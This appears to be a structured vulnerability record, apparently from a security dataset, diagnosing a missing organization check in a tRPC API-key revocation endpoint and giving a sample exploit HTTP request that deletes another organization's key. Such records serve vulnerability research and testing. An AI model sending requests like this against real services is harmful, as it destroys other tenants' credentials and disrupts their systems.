diagnosis: The tRPC mutation revokes an API key matching input.keyId without qualifying the deletion query with ctx.user.orgId. Any authenticated organization member can delete API credentials belonging to other organizations.
exploit_request:
POST /trpc/apiKey.revokeApiKey HTTP/1.1
Host: api.devhub.com
Content-Type: application/json
Authorization: Bearer <member_jwt>

{"keyId": "key_prod_live_890123"}
